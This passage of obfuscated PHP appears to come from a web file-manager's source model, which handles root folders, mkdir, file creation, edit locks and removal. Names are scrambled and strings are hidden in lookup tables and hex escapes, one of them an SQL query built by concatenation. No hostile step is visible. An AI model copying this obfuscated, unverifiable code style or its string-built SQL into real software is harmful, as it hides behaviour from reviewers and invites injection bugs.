$øÊó€ó“[$≥’ƒÇàÚ[98]] = array($øÊó€ó“[$≥’ƒÇàÚ[98]], $≠¥–⁄√˜, $≥’ƒÇàÚ[2269]); } else { $øÊó€ó“[$≥’ƒÇàÚ[98]] = $≠¥–⁄√˜; } } if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2261]]) && $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2261]] > 0) { $øÊó€ó“[$≥’ƒÇàÚ[89]] = array($≥’ƒÇàÚ[2267], $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2261]]); } if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2262]]) && $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2262]]) { $≠¥–⁄√˜ = array($≥’ƒÇàÚ[2268], $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2262]]); if ($øÊó€ó“[$≥’ƒÇàÚ[89]]) { $øÊó€ó“[$≥’ƒÇàÚ[89]] = array($øÊó€ó“[$≥’ƒÇàÚ[89]], $≠¥–⁄√˜, $≥’ƒÇàÚ[2269]); } else { $øÊó€ó“[$≥’ƒÇàÚ[89]] = $≠¥–⁄√˜; } } if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[676]]) && $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[676]]) { $øÊó€ó“[] = array($≥’ƒÇàÚ[540] => $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[676]], $≥’ƒÇàÚ[538] => $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[676]], $≥’ƒÇàÚ[1092] => $≥’ƒÇàÚ[2090]); } if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[497]]) && $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[497]]) { $Ìîµ˝˙ì = $ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[497]]; if ($Ìîµ˝˙ì == $≥’ƒÇàÚ[88]) { $øÊó€ó“[$≥’ƒÇàÚ[496]] = 1; } else { if ($Ìîµ˝˙ì == $≥’ƒÇàÚ[2270]) { $øÊó€ó“[$≥’ƒÇàÚ[496]] = 0; } else { if ($Ìîµ˝˙ì) { $Ìîµ˝˙ì = is_array($Ìîµ˝˙ì) ? $Ìîµ˝˙ì : explode($≥’ƒÇàÚ[50], $Ìîµ˝˙ì); $øÊó€ó“[$≥’ƒÇàÚ[497]] = array($≥’ƒÇàÚ[503], $Ìîµ˝˙ì); $øÊó€ó“[$≥’ƒÇàÚ[496]] = 0; } } } } $this->_parseSearchParent($ûÅ⁄¢˛Ì, $øÊó€ó“); if (isset($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2086]]) && trim($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2086]])) { $÷û¸¯∞ú = trim($ûÅ⁄¢˛Ì[$≥’ƒÇàÚ[2086]]); $ÏàÃ±™Ÿ = explode($≥’ƒÇàÚ[53], $÷û¸¯∞ú); if (strlen($÷û¸¯∞ú) > 2 && (substr($÷û¸¯∞ú, 0, 1) == $≥’ƒÇàÚ[131] && substr($÷û¸¯∞ú, -1) == $≥’ƒÇàÚ[131]) || substr($÷û¸¯∞ú, 0, 1) == $≥’ƒÇàÚ[68] && substr($÷û¸¯∞ú, -1) == $≥’ƒÇàÚ[68]) { $÷û¸¯∞ú = substr($÷û¸¯∞ú, 1, -1); $ÏàÃ±™Ÿ = array($÷û¸¯∞ú); } $øÊó€ó“[$≥’ƒÇàÚ[32]] = array(array($≥’ƒÇàÚ[626], $≥’ƒÇàÚ[2088] . $÷û¸¯∞ú . $≥’ƒÇàÚ[2088])); if (count($ÏàÃ±™Ÿ) > 1) { $øÊó€ó“[$≥’ƒÇàÚ[32]] = array(); foreach ($ÏàÃ±™Ÿ as $æá±…ûŸ) { if (!trim($æá±…ûŸ)) { continue; } $øÊó€ó“[$≥’ƒÇàÚ[32]][] = array($≥’ƒÇàÚ[626], $≥’ƒÇàÚ[2088] . trim($æá±…ûŸ) . $≥’ƒÇàÚ[2088]); } } } return $øÊó€ó“; } private function _parseSearchParent($°πô•˙Ç, &$—≤§Ò˚Ó) { $‡ÆﬂÃÊê =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($°πô•˙Ç[$‡ÆﬂÃÊê[202]]) || !$°πô•˙Ç[$‡ÆﬂÃÊê[202]]) { return; } $† Ü•úù = $this->pathInfo($°πô•˙Ç[$‡ÆﬂÃÊê[202]]); $∏ó≈Ó˝∆ = $† Ü•úù[$‡ÆﬂÃÊê[202]] . $‡ÆﬂÃÊê[12] === $‡ÆﬂÃÊê[240]; $ªä“®œ“ = $† Ü•úù[$‡ÆﬂÃÊê[200]] == $‡ÆﬂÃÊê[589]; if ($† Ü•úù[$‡ÆﬂÃÊê[605]] == $‡ÆﬂÃÊê[606]) { $´˚∑ Ãî = $this->sourceInfo($°πô•˙Ç[$‡ÆﬂÃÊê[202]]); $† Ü•úù[$‡ÆﬂÃÊê[595]] = $´˚∑ Ãî[$‡ÆﬂÃÊê[595]]; } $—≤§Ò˚Ó[$‡ÆﬂÃÊê[666]] = array($‡ÆﬂÃÊê[626], $† Ü•úù[$‡ÆﬂÃÊê[595]] . $°πô•˙Ç[$‡ÆﬂÃÊê[202]] . $‡ÆﬂÃÊê[627]); $À¬˛ı»Ï = isset($°πô•˙Ç[$‡ÆﬂÃÊê[1946]]) && in_array($‡ÆﬂÃÊê[589], $°πô•˙Ç[$‡ÆﬂÃÊê[1946]]); if (!$À¬˛ı»Ï || !$ªä“®œ“ || !$∏ó≈Ó˝∆ || !$† Ü•úù[$‡ÆﬂÃÊê[498]]) { return; } if (!AuthModel::authCheckRoot($† Ü•úù[$‡ÆﬂÃÊê[498]][$‡ÆﬂÃÊê[499]])) { return; } $≤ÒΩèÙ≥ = $† Ü•úù[$‡ÆﬂÃÊê[580]] . $‡ÆﬂÃÊê[12]; if ($≤ÒΩèÙ≥ == $‡ÆﬂÃÊê[101]) { unset($—≤§Ò˚Ó[$‡ÆﬂÃÊê[666]]); $—≤§Ò˚Ó[$‡ÆﬂÃÊê[200]] = self::TYPE_GROUP; return; } $ãÜ˚§íÇ = Model($‡ÆﬂÃÊê[596])->groupChildrenAll($≤ÒΩèÙ≥); $‡Ö‰∑˜¨ = count($ãÜ˚§íÇ); if ($‡Ö‰∑˜¨ <= 1) { return; } $¸ÿ÷û¨¿ = array($‡ÆﬂÃÊê[202] => 0, $‡ÆﬂÃÊê[200] => self::TYPE_GROUP, $‡ÆﬂÃÊê[580] => array($‡ÆﬂÃÊê[7], $ãÜ˚§íÇ)); $≠Å∫ª≠ñ = $this->field($‡ÆﬂÃÊê[2271])->where($¸ÿ÷û¨¿)->limit($‡Ö‰∑˜¨)->select(); $—≤§Ò˚Ó[$‡ÆﬂÃÊê[666]] = array(); foreach ($≠Å∫ª≠ñ as $ôûæòâÉ) { $—≤§Ò˚Ó[$‡ÆﬂÃÊê[666]][] = array($‡ÆﬂÃÊê[626], $‡ÆﬂÃÊê[604] . $ôûæòâÉ[$‡ÆﬂÃÊê[203]] . $‡ÆﬂÃÊê[627]); } $—≤§Ò˚Ó[$‡ÆﬂÃÊê[666]][] = $‡ÆﬂÃÊê[2090]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($œÔÿ£˙†) { $à◊„∂Èñ =& $_SERVER[ˆë€Ï⁄∂]; $Úìı›∑∞ = Model($à◊„∂Èñ[588])->where(array($à◊„∂Èñ[1778] => $œÔÿ£˙†))->find(); $∑˙∏„ = $this->_mkdirRoot(SourceModel::TYPE_USER, $œÔÿ£˙†, $Úìı›∑∞[$à◊„∂Èñ[32]]); $this->userDesktopAdd($∑˙∏„); return $∑˙∏„; } public function userDesktopAdd($¶Áóﬁ≈√) { $ØÇÇ¯∑Å =& $_SERVER[ˆë€Ï⁄∂]; $¯îäïÄ∏ = LNG($ØÇÇ¯∑Å[2272]); $éöƒ≥≈¢ = $this->mkdir($¶Áóﬁ≈√, $¯îäïÄ∏); $this->metaSet($éöƒ≥≈¢, $ØÇÇ¯∑Å[2273], $ØÇÇ¯∑Å[101]); $this->metaSet($¶Áóﬁ≈√, $ØÇÇ¯∑Å[2274], $éöƒ≥≈¢); } public function userPathSafeAdd($¢·Î≤¬Ü) { $π¶§îﬁΩ =& $_SERVER[ˆë€Ï⁄∂]; $ûÛÔŒ≠ô = Model($π¶§îﬁΩ[588])->getInfoFull($¢·Î≤¬Ü); if (!$ûÛÔŒ≠ô) { return !1; } if (_get($ûÛÔŒ≠ô, $π¶§îﬁΩ[609])) { return $ûÛÔŒ≠ô[$π¶§îﬁΩ[550]][$π¶§îﬁΩ[2275]]; } $Èƒﬁ¬¬ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¢·Î≤¬Ü, $π¶§îﬁΩ[2276], $π¶§îﬁΩ[2277]); Model($π¶§îﬁΩ[588])->metaSet($¢·Î≤¬Ü, $π¶§îﬁΩ[2275], $Èƒﬁ¬¬); $this->metaSet($Èƒﬁ¬¬, $π¶§îﬁΩ[2278], $¢·Î≤¬Ü); return $Èƒﬁ¬¬; } public function userPathAppAdd($í‹¬Øß—, $ëà±ÛÍ˛ = '', $êì±òÇ∆ = '') { $ı√˚Æ¯„ =& $_SERVER[ˆë€Ï⁄∂]; $±˚⁄¸·Ç = Model($ı√˚Æ¯„[588])->getInfoFull($í‹¬Øß—); if (!$±˚⁄¸·Ç) { return !1; } $è√Ò‚˛◊ = $±˚⁄¸·Ç[$ı√˚Æ¯„[550]] ? $±˚⁄¸·Ç[$ı√˚Æ¯„[550]] : array(); $“‚‘å∏ü = $è√Ò‚˛◊[$ı√˚Æ¯„[2279]]; if (!$“‚‘å∏ü) { $“‚‘å∏ü = $this->_mkdirRoot(SourceModel::TYPE_USER, $í‹¬Øß—, $ı√˚Æ¯„[2280], $ı√˚Æ¯„[2281]); Model($ı√˚Æ¯„[588])->metaSet($í‹¬Øß—, $ı√˚Æ¯„[2279], $“‚‘å∏ü . $ı√˚Æ¯„[12]); $this->metaSet($“‚‘å∏ü, $ı√˚Æ¯„[2279], $í‹¬Øß—); } if (!$ëà±ÛÍ˛) { return $“‚‘å∏ü; } $¡ÆëÏ∆Õ = $è√Ò‚˛◊[$ı√˚Æ¯„[2282] . $ëà±ÛÍ˛]; if (!$¡ÆëÏ∆Õ) { $¡ÆëÏ∆Õ = $this->mkdir($“‚‘å∏ü, $ëà±ÛÍ˛); Model($ı√˚Æ¯„[588])->metaSet($í‹¬Øß—, $ı√˚Æ¯„[2282] . $ëà±ÛÍ˛, $¡ÆëÏ∆Õ); $this->metaSet($¡ÆëÏ∆Õ, $ı√˚Æ¯„[2282] . $ëà±ÛÍ˛, $í‹¬Øß—); } if (!$êì±òÇ∆) { return $¡ÆëÏ∆Õ; } $˘û∫ˆÇ˜ = $this->mkdir($¡ÆëÏ∆Õ, $êì±òÇ∆); return $˘û∫ˆÇ˜; } public function groupRootAdd($÷Ò‹Á°Œ) { $™ÿ—£€´ =& $_SERVER[ˆë€Ï⁄∂]; $â‚Íóá— = Model($™ÿ—£€´[596])->where(array($™ÿ—£€´[2080] => $÷Ò‹Á°Œ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $÷Ò‹Á°Œ, $â‚Íóá—[$™ÿ—£€´[32]]); } public function systemRootPathAdd($è≠úº°) { if ($è≠úº° != $_SERVER[ˆë€Ï⁄∂][619]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $è≠úº°); } public function userRootRemove($ù¬øêî‚) { $§÷—¿îñ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ù¬øêî‚, !0); foreach ($§÷—¿îñ as $ÙõÖËã≥) { if (!$ÙõÖËã≥) { continue; } $this->remove($ÙõÖËã≥[$_SERVER[ˆë€Ï⁄∂][203]], !1); } } public function groupRootRemove($úÜ’¥áã) { $ôÇ¶ÅïÌ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $úÜ’¥áã); if (!$ôÇ¶ÅïÌ) { return; } $this->remove($ôÇ¶ÅïÌ[$_SERVER[ˆë€Ï⁄∂][203]], !1); } private function _mkdirRoot($º¶˚»´â, $“ÏŸá˝®, $¯ü€ù∆Ä, $…ÿÁ©ˆ± = '') { $ˆÖ˚ÑÏû =& $_SERVER[ˆë€Ï⁄∂]; $‰ÕºìÏß = defined($ˆÖ˚ÑÏû[2218]) ? USER_ID : 0; $àﬁÜıçı = array($ˆÖ˚ÑÏû[488] => 0, $ˆÖ˚ÑÏû[662] => $º¶˚»´â, $ˆÖ˚ÑÏû[663] => $“ÏŸá˝®, $ˆÖ˚ÑÏû[660] => 1, $ˆÖ˚ÑÏû[664] => $‰ÕºìÏß, $ˆÖ˚ÑÏû[665] => $‰ÕºìÏß, $ˆÖ˚ÑÏû[661] => $…ÿÁ©ˆ±, $ˆÖ˚ÑÏû[666] => $ˆÖ˚ÑÏû[604], $ˆÖ˚ÑÏû[515] => 0, $ˆÖ˚ÑÏû[631] => 0, $ˆÖ˚ÑÏû[553] => 0, $ˆÖ˚ÑÏû[667] => $ˆÖ˚ÑÏû[12]); if ($ÕÍÄçßª = $this->where($àﬁÜıçı)->find()) { return $ÕÍÄçßª[$ˆÖ˚ÑÏû[203]]; } $ë¡™Üµ˝ = "\115\x6f\x64\x65\x6c\123\157\x75\162\143\x65\56\x6d\153\144\151\162\x52\x6f\157\164\x2e{$º¶˚»´â}\x2e{$“ÏŸá˝®}\56" . $¯ü€ù∆Ä; CacheLock::lock($ë¡™Üµ˝); $àﬁÜıçı[$ˆÖ˚ÑÏû[32]] = $¯ü€ù∆Ä; $®‰®˝À÷ = $this->add($àﬁÜıçı); $€“¿◊Ññ = array($ˆÖ˚ÑÏû[668] => short_id($®‰®˝À÷)); $this->where(array($ˆÖ˚ÑÏû[502] => $®‰®˝À÷))->save($€“¿◊Ññ); CacheLock::unlock($ë¡™Üµ˝); return $®‰®˝À÷; } private function targetSourceRoot($î®™«ÿ˝, $™àÃÌΩ‚, $Ïπ‚“–ë = false) { $ûí–·í≤ =& $_SERVER[ˆë€Ï⁄∂]; $∏ ‡ﬂ£« = array($ûí–·í≤[488] => 0, $ûí–·í≤[662] => $î®™«ÿ˝, $ûí–·í≤[663] => $™àÃÌΩ‚); if ($Ïπ‚“–ë) { $ı∏Ò˜Ô¶ = $this->where($∏ ‡ﬂ£«)->select(); return $ı∏Ò˜Ô¶ ? $ı∏Ò˜Ô¶ : array(); } $í˛ÛÁªô = $this->where($∏ ‡ﬂ£«)->find(); return $í˛ÛÁªô ? $í˛ÛÁªô : array(); } public function sourceRootGroup($≈¿÷˘•‘) { $ª«‰ô•® =& $_SERVER[ˆë€Ï⁄∂]; if (is_string($≈¿÷˘•‘)) { $≈¿÷˘•‘ = array($≈¿÷˘•‘); } $†ôı“ñÍ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $≈¿÷˘•‘, $ª«‰ô•®[232]); $’Ô˙Õíï = array($ª«‰ô•®[456] => $†ôı“ñÍ, $ª«‰ô•®[453] => array($ª«‰ô•®[849] => count($≈¿÷˘•‘))); $this->_listDataApply($’Ô˙Õíï[$ª«‰ô•®[456]]); $this->_listMake($’Ô˙Õíï); return array_to_keyvalue($’Ô˙Õíï[$ª«‰ô•®[95]], $ª«‰ô•®[580]); } public function mkfile($√ÒïñèÆ, $ß◊ÀƒÙÊ, $ˆ–ƒéÛÁ = '', $–∂˜ô•é = REPEAT_RENAME) { $¨é˝Üå⁄ =& $_SERVER[ˆë€Ï⁄∂]; $·ë©‘ˆó = Model($¨é˝Üå⁄[688])->addFileByContent($ˆ–ƒéÛÁ, $ß◊ÀƒÙÊ); return $this->_createFileCall($√ÒïñèÆ, $ß◊ÀƒÙÊ, $·ë©‘ˆó, $–∂˜ô•é, $¨é˝Üå⁄[1446]); } public function addFile($é¿±∞âñ, $â√˘√Ëñ, $ﬁæÅ•ÏÊ, $¸ä™Æä÷ = false, $ÛÁÁ®ŒÁ = REPEAT_RENAME) { $∏‚Î‡òÃ = Model($_SERVER[ˆë€Ï⁄∂][688])->addFile($â√˘√Ëñ, $ﬁæÅ•ÏÊ, $¸ä™Æä÷); return $this->_createFileCall($é¿±∞âñ, $ﬁæÅ•ÏÊ, $∏‚Î‡òÃ, $ÛÁÁ®ŒÁ); } public function addFileByFileID($˙ã◊çº∞, $≥Ê°æù˜, $ÑÎ·œ·è, $äÅÀË®œ = REPEAT_RENAME) { $Ÿ„ö˘ô‡ =& $_SERVER[ˆë€Ï⁄∂]; $ˆåºö·´ = Model($Ÿ„ö˘ô‡[688])->find($≥Ê°æù˜); Model($Ÿ„ö˘ô‡[688])->linkAdd($≥Ê°æù˜); return $this->_createFileCall($˙ã◊çº∞, $ÑÎ·œ·è, $ˆåºö·´, $äÅÀË®œ); } public function addFileByRemote($â‹»¬‡º, $√ı∫‰Çñ, $äË•«”¯, $ô∫é¿Å≥ = array(), $ èà¸∫ï = REPEAT_RENAME) { $¨∏‚©ŒŒ = Model($_SERVER[ˆë€Ï⁄∂][688])->addFileByRemote($√ı∫‰Çñ, $äË•«”¯, $ô∫é¿Å≥); return $this->_createFileCall($â‹»¬‡º, $äË•«”¯, $¨∏‚©ŒŒ, $ èà¸∫ï); } private function _createFileCall($Å∂ó‚èÑ, $…§Âö†», $î˚“¥≠•, $Ùñ¸•‹µ, $®Óúﬁ€Ù = "\x75\160\x6c\157\x61\x64") { $›È¥ÂΩ∫ =& $_SERVER[ˆë€Ï⁄∂]; $ûÍ„Ö‹ô = !1; $this->setMasterDB(); $this->lockWriteStart($Å∂ó‚èÑ, $…§Âö†»); $Ãí”ΩÊÆ = $this->fileNameExist($Å∂ó‚èÑ, $…§Âö†»); $ñﬂåË™› = $this->_createFile($Å∂ó‚èÑ, $…§Âö†», $î˚“¥≠•, $Ùñ¸•‹µ, $ûÍ„Ö‹ô); if (!$ûÍ„Ö‹ô) { Model($›È¥ÂΩ∫[555])->remove($î˚“¥≠•[$›È¥ÂΩ∫[552]]); } if ($ûÍ„Ö‹ô && $ñﬂåË™› && $ñﬂåË™› != $Ãí”ΩÊÆ) { Model($›È¥ÂΩ∫[2245])->eventCreate($ñﬂåË™›, $®Óúﬁ€Ù); } $this->lockWriteEnd($Å∂ó‚èÑ, $…§Âö†»); return $ñﬂåË™›; } public function mkdir($•êåŸóƒ, $™ìÖú“‚, $ÌáÅ›Àù = REPEAT_SKIP) { $õëø”˜ù =& $_SERVER[ˆë€Ï⁄∂]; $this->setMasterDB(); $˙ÓÅ∆÷± = $this->sourceInfo($•êåŸóƒ); if (!$˙ÓÅ∆÷±) { return !1; } $this->lockWriteStart($•êåŸóƒ, $™ìÖú“‚); if ($ÌáÅ›Àù !== !1) { $ëÛÆêËƒ = $this->fileNameExist($•êåŸóƒ, $™ìÖú“‚); if ($ëÛÆêËƒ && $ÌáÅ›Àù != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($•êåŸóƒ, $™ìÖú“‚); return $ëÛÆêËƒ; } $™ìÖú“‚ = $this->fileNameAuto($•êåŸóƒ, $™ìÖú“‚, $ÌáÅ›Àù); } $åÌ·∞‡ﬁ = array($õëø”˜ù[660] => 1, $õëø”˜ù[505] => $™ìÖú“‚, $õëø”˜ù[661] => $õëø”˜ù[12], $õëø”˜ù[553] => 0, $õëø”˜ù[631] => 0); $ƒÓüÖﬁ = $this->_addSource($åÌ·∞‡ﬁ, $˙ÓÅ∆÷±); Model($õëø”˜ù[2245])->eventCreate($ƒÓüÖﬁ, $õëø”˜ù[1447]); $this->lockWriteEnd($•êåŸóƒ, $™ìÖú“‚); return $ƒÓüÖﬁ; } public function listSourceRoot($É·å„ô¸, $µì££Í£, $≠·§Üöï = "\163\x6f\165\x72\x63\x65\x49\104\54\164\141\162\x67\x65\x74\x49\104\54\163\151\x7a\x65") { $Å‹¡⁄™Ÿ =& $_SERVER[ˆë€Ï⁄∂]; $·àﬂâΩß = $Å‹¡⁄™Ÿ[465]; $ˆúÚª◊ü = array(); $ÿ≤¥äÖ∏ = 1024 * 50; $π—”·Ò¬ = is_array($π—”·Ò¬) ? $π—”·Ò¬ : array(); $…ªøö√Á = count($µì££Í£); $–Ÿ≤È¶ê = $this->tablePrefix . $Å‹¡⁄™Ÿ[2283]; for ($Õ ≥û∑∫ = 0; $Õ ≥û∑∫ < $…ªøö√Á; $Õ ≥û∑∫++) { $Í€ç¸Ì¯ = $µì££Í£[$Õ ≥û∑∫]; $·àﬂâΩß .= "\x53\105\114\x45\103\124\40\52\40\106\122\117\115\40\50\x53\x45\x4c\x45\103\x54\40{$≠·§Üöï}\40\x46\122\x4f\115\40\x60{$–Ÿ≤È¶ê}\x60\40\127\x48\105\122\x45\40"; $·àﬂâΩß .= "\x60\160\x61\162\x65\156\x74\111\x44\140\75\60\40\101\x4e\x44\40\140\x74\141\x72\147\x65\x74\x49\104\140\x3d{$Í€ç¸Ì¯}\40\101\116\x44\x20\140\x74\x61\162\x67\145\x74\x54\x79\x70\x65\140\75{$É·å„ô¸}\40\141\156\144\x20\x66\x69\154\x65\x54\x79\x70\145\x3d\47\47\40\154\x69\x6d\x69\164\x20\x31\51\40\141\x73\x20\x74\x62\137{$Õ ≥û∑∫}\40\125\116\x49\x4f\x4e\40\101\114\114\40"; if ((strlen($·àﬂâΩß) >= $ÿ≤¥äÖ∏ || $Õ ≥û∑∫ == $…ªøö√Á - 1) && $·àﬂâΩß) { $·àﬂâΩß = substr($·àﬂâΩß, 0, -strlen($Å‹¡⁄™Ÿ[1130])); $§çÎ£°† = $this->query($·àﬂâΩß); $·àﬂâΩß = $Å‹¡⁄™Ÿ[12]; $ˆúÚª◊ü = array_merge($ˆúÚª◊ü, $§çÎ£°†); } } return $ˆúÚª◊ü; } private function _createFile($≈«πÂ‡™, $ûèˆû≤÷, $¨íè˝úî, $˜ˆÌ‘ÀÎ, &$∏∆±ºÏü) { $ì¢®®„ =& $_SERVER[ˆë€Ï⁄∂]; $¥‡ì‡Ø¥ = $this->sourceInfo($≈«πÂ‡™); if (!$¨íè˝úî || !$¥‡ì‡Ø¥) { return !1; } if ($˜ˆÌ‘ÀÎ !== !1) { $´∏Îãñ˛ = $this->fileNameExist($≈«πÂ‡™, $ûèˆû≤÷); } $∏∆±ºÏü = !0; if ($˜ˆÌ‘ÀÎ && $´∏Îãñ˛) { if ($˜ˆÌ‘ÀÎ == REPEAT_SKIP) { $∏∆±ºÏü = !1; return $´∏Îãñ˛; } else { if ($˜ˆÌ‘ÀÎ == REPEAT_REPLACE) { $∑≤«©øÚ = $this->sourceInfo($´∏Îãñ˛); $ì´’öÑú = $this->fileHistory($∑≤«©øÚ, $¨íè˝úî[$ì¢®®„[552]], $¨íè˝úî[$ì¢®®„[89]]); if (!$ì´’öÑú) { $∏∆±ºÏü = !1; } else { $this->folderSizeReset($≈«πÂ‡™); } return $´∏Îãñ˛; } else { $ûèˆû≤÷ = $this->fileNameAuto($≈«πÂ‡™, $ûèˆû≤÷, $˜ˆÌ‘ÀÎ, !1); } } } $™õﬁ˝Óì = array($ì¢®®„[660] => 0, $ì¢®®„[505] => $ûèˆû≤÷, $ì¢®®„[661] => substr(get_path_ext($ûèˆû≤÷), 0, 10), $ì¢®®„[553] => $¨íè˝úî[$ì¢®®„[552]], $ì¢®®„[631] => $¨íè˝úî[$ì¢®®„[89]]); $ÀÎì€‘  = $this->_addSource($™õﬁ˝Óì, $¥‡ì‡Ø¥); $this->folderSizeReset($≈«πÂ‡™, intval($™õﬁ˝Óì[$ì¢®®„[89]])); return $ÀÎì€‘ ; } protected function fileHistory($Ñ∞∆≠∏Ã, $µ˛≤Ô≥, $ÒŸﬁ€Ùü) { $∏…ÆˆÈÕ =& $_SERVER[ˆë€Ï⁄∂]; if ($Ñ∞∆≠∏Ã[$∏…ÆˆÈÕ[552]] == $µ˛≤Ô≥) { return !1; } $this->checkLock($Ñ∞∆≠∏Ã[$∏…ÆˆÈÕ[203]], $µ˛≤Ô≥); Model($∏…ÆˆÈÕ[2284])->addHistory($Ñ∞∆≠∏Ã); $≥üëó∫ò = array($∏…ÆˆÈÕ[665] => USER_ID, $∏…ÆˆÈÕ[509] => time(), $∏…ÆˆÈÕ[552] => $µ˛≤Ô≥, $∏…ÆˆÈÕ[89] => $ÒŸﬁ€Ùü); $this->where(array($∏…ÆˆÈÕ[502] => $Ñ∞∆≠∏Ã[$∏…ÆˆÈÕ[203]]))->save($≥üëó∫ò); $this->sourceCacheClear($Ñ∞∆≠∏Ã[$∏…ÆˆÈÕ[203]]); return !0; } public function checkLock($˛ÄÏ˚±„, $¶ﬂéä“›) { $ï°êñ¢» =& $_SERVER[ˆë€Ï⁄∂]; $±Ã“å£À = $this->pathInfo($˛ÄÏ˚±„); if (!$this->fileIsLock($±Ã“å£À, !0)) { return; } $ü≈éËÁà = Session::get($ï°êñ¢»[2285]); $√øÒ¢Ä® = substr($±Ã“å£À[$ï°êñ¢»[32]], 0, -1 - strlen($±Ã“å£À[$ï°êñ¢»[179]])) . $ï°êñ¢»[1308] . $ü≈éËÁà . $ï°êñ¢»[10] . $±Ã“å£À[$ï°êñ¢»[179]]; $ÑÚ¡ê⁄Ë = Model($ï°êñ¢»[688])->find($¶ﬂéä“›); $this->_createFileCall($±Ã“å£À[$ï°êñ¢»[202]], $√øÒ¢Ä®, $ÑÚ¡ê⁄Ë, REPEAT_REPLACE, $ï°êñ¢»[1446]); $ı“ª˜Ò„ = $±Ã“å£À[$ï°êñ¢»[550]][$ï°êñ¢»[624]]; $æ¯Ï§≈¥ = $ı“ª˜Ò„[$ï°êñ¢»[2286]] ? $ı“ª˜Ò„[$ï°êñ¢»[2286]] : $ı“ª˜Ò„[$ï°êñ¢»[32]]; show_json(LNG($ï°êñ¢»[2287]) . $ï°êñ¢»[2288] . LNG($ï°êñ¢»[2289]) . $ï°êñ¢»[2290] . $æ¯Ï§≈¥ . $ï°êñ¢»[2291], !1); } public function fileIsLock($È¬ì´ô’, $ˆôÚø‘Ú = false) { $èâ”∑üú =& $_SERVER[ˆë€Ï⁄∂]; if (!_get($È¬ì´ô’, $èâ”∑üú[620], 0)) { return !1; } if ($È¬ì´ô’[$èâ”∑üú[550]][$èâ”∑üú[623]] != USER_ID) { return !0; } $òÒ»˚‘Ô = $GLOBALS[$èâ”∑üú[6]][$èâ”∑üú[102]][$èâ”∑üú[621]]; if ($È¬ì´ô’[$èâ”∑üú[550]][$èâ”∑üú[622]] <= time() - $òÒ»˚‘Ô) { $this->metaSet($È¬ì´ô’[$èâ”∑üú[203]], $èâ”∑üú[623], null); $this->metaSet($È¬ì´ô’[$èâ”∑üú[203]], $èâ”∑üú[622], null); } if ($ˆôÚø‘Ú) { $this->metaSet($È¬ì´ô’[$èâ”∑üú[203]], $èâ”∑üú[622], time()); } return !1; } private function _addSource($ﬂï˘üÀÁ, $°ó©‹„¥) { $ø üÒï =& $_SERVER[ˆë€Ï⁄∂]; $∑¥°˜êá = defined($ø üÒï[2218]) ? USER_ID : 0; $∞§¯¢∏ø = array($ø üÒï[662] => $°ó©‹„¥[$ø üÒï[200]], $ø üÒï[663] => $°ó©‹„¥[$ø üÒï[580]], $ø üÒï[664] => $∑¥°˜êá, $ø üÒï[665] => $∑¥°˜êá, $ø üÒï[488] => $°ó©‹„¥[$ø üÒï[203]], $ø üÒï[666] => $°ó©‹„¥[$ø üÒï[595]] . $°ó©‹„¥[$ø üÒï[203]] . $ø üÒï[50], $ø üÒï[515] => 0, $ø üÒï[667] => $ø üÒï[12]); $ﬂï˘üÀÁ = array_merge($∞§¯¢∏ø, $ﬂï˘üÀÁ); $this->updateModifyTime($ﬂï˘üÀÁ[$ø üÒï[202]]); $û˝≤á–‹ = $ø üÒï[2292] . $°ó©‹„¥[$ø üÒï[203]]; if (isset(self::$cacheChildList[$û˝≤á–‹])) { unset(self::$cacheChildList[$û˝≤á–‹]); } static $å»ºÓıè = false; if (!$å»ºÓıè) { Hook::trigger($ø üÒï[650], $ﬂï˘üÀÁ); $å»ºÓıè = !0; } $ø¨¯àÃ˚ = $this->add($ﬂï˘üÀÁ); $ßÿ˘Çü´ = array($ø üÒï[668] => short_id($ø¨¯àÃ˚)); $this->where(array($ø üÒï[502] => $ø¨¯àÃ˚))->save($ßÿ˘Çü´); $this->setNamePinyin($ø¨¯àÃ˚, $ﬂï˘üÀÁ[$ø üÒï[32]]); return $ø¨¯àÃ˚; } public function remove($ÑËßµ¥à, $ìîÆº˜ã = true) { $ç¨“Î≤Ω =& $_SERVER[ˆë€Ï⁄∂]; $†—ƒèÅá = $this->sourceInfo($ÑËßµ¥à); $ç≤«òÁﬂ = intval($†—ƒèÅá[$ç¨“Î≤Ω[200]]) === self::TYPE_SYSTEM; $ƒ≥ÓﬂÙ„ = Model($ç¨“Î≤Ω[519])->get($ç¨“Î≤Ω[2293]) == $ç¨“Î≤Ω[101]; if ($ç≤«òÁﬂ || $ìîÆº˜ã || !$ƒ≥ÓﬂÙ„) { return $this->removeNow($ÑËßµ¥à, $ìîÆº˜ã); } $Â˙·õ˜ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Íâºè€™ = $†—ƒèÅá[$ç¨“Î≤Ω[200]] == self::TYPE_USER ? $ç¨“Î≤Ω[676] : $ç¨“Î≤Ω[589]; if ($Íâºè€™ == $ç¨“Î≤Ω[676]) { $»ΩÇöÏÇ = Model($ç¨“Î≤Ω[588])->getInfo($†—ƒèÅá[$ç¨“Î≤Ω[580]]); $ÔÙÜπÓœ = !empty($»ΩÇöÏÇ[$ç¨“Î≤Ω[2286]]) ? $»ΩÇöÏÇ[$ç¨“Î≤Ω[2286]] : 